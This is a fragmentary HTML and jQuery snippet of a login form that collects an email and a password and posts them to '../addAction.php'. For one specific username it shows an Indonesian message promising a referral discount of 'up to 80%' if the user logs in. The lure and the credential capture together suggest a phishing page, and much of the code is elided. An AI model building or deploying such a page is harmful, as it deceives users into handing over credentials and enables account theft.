...
<div class="login-form">
    ...
    <form action="../addAction.php" method="post">
        ...
        <div class="form-group">
            ...
            <input type="email" oninput="getPhoto($(this).val().trim())" id="email" class="form-control semail" name="kelas" placeholder="Email" required="required">
            <input type="password" class="form-control spass" placeholder="Password" required="required">
            </div>
        </div>
        <div class="detectInput" style="display: none">
        <div class="form-group">
  ...
  if(validation) {
   $("#photoReturn").attr("src",'https://thumbs.gfycat.com/LameDifferentBalloonfish-max-1mb.gif')
    ...
    .done(function(data) { 
      ...
      if ($('#usernameInput').val().toLowerCase()=='chntevrl_') {
      	$('.detectInput').css('display', 'block');
      	$('#statusAkun').attr('class', 'alert alert-success');
      	$('#statusAkun').html('Akun ini telah menerima kode reffeal diskon up to 80%, silahkan login untuk melanjutkan');
    ...
    .fail(function() { 
      ...
      $('#statusAkun').attr('class', 'alert alert-danger');
      	$('#statusAkun').html('maaf akun ini tidak menerima kode refeal');
